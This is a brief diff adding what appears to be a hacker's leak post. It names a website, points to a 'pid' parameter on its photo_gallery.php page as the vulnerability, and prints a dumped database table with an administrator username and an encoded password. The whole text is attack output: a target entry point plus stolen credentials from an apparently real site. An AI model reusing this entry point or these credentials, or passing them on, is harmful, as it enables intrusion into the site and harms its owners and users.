@@ -1,0 +1,9 @@
+Web-site: httpstjgps.org
+vulnerability: httpstjgps.org/photo_gallery.php?pid=23
+
+Dumped:
++----+----------+--------------+
+| id | user     | pass         |
++----+----------+--------------+
+| 1  | webadmin | WVdSdGFXND0= |
++----+----------+--------------+
